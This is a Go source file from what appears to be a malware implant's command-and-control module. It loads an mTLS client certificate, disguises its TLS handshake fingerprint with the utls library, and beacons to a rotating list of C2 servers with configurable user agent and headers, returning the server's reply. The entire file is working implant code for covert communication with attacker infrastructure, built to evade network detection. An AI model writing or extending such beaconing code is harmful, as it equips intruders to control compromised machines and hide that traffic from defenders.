//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/x509"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	utls "github.com/refraction-networking/utls"
)

var (
	mtlsClientCert utls.Certificate
	mtlsCertLoaded bool
)

func initMTLS() {
	if MTLSCertStr == "" || MTLSKeyStr == "" {
		return
	}
	cert, err := utls.X509KeyPair([]byte(MTLSCertStr), []byte(MTLSKeyStr))
	if err != nil {
		if Debug {
			fmt.Printf("[!] mTLS: failed to load client cert: %v\n", err)
		}
		return
	}
	mtlsClientCert = cert
	mtlsCertLoaded = true

	if MTLSCAStr != "" {
		pool := x509.NewCertPool()
		if pool.AppendCertsFromPEM([]byte(MTLSCAStr)) {
			mtlsCAPool = pool
		}
	}
}

var mtlsTransport = &http.Transport{
	MaxIdleConns:        10,
	MaxIdleConnsPerHost: 5,
	IdleConnTimeout:     60 * time.Second,
}

func init() {
	// Route mTLS through the utls dialer so the client handshake uses a
	// realistic ClientHello (and the loaded client cert/CA) instead of the
	// Go-stdlib fingerprint.
	mtlsTransport.DialTLSContext = utlsDialContext
}

var mtlsClient = &http.Client{
	Transport: mtlsTransport,
	Timeout:   30 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 3 {
			return http.ErrUseLastResponse
		}
		return nil
	},
}

func sendMTLSBeacon(body []byte) []byte {
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		c2URL := urls[idx]

		if !strings.HasPrefix(c2URL, "mtls://") {
			continue
		}

		httpURL := "https://" + strings.TrimPrefix(c2URL, "mtls://")

		method := getActiveBeaconMethodFromConfig()
		if method == "" {
			method = "POST"
		}
		req, err := http.NewRequest(method, httpURL+getActiveBeaconURIFromConfig(), bytes.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		for k, v := range getActiveHeaders() {
			if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
				continue
			}
			req.Header.Set(k, v)
		}

		resp, err := mtlsClient.Do(req)
		if err != nil {
			if Debug {
				fmt.Printf("[!] mTLS beacon to %s failed: %v\n", c2URL, err)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			if Debug {
				fmt.Printf("[!] mTLS %s returned %d\n", c2URL, resp.StatusCode)
			}
			continue
		}

		data, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		currentC2Idx.Store(int32(idx))
		if Debug {
			fmt.Printf("[+] mTLS Beacon OK from %s, response %d bytes\n", c2URL, len(data))
		}
		return data
	}
	return nil
}
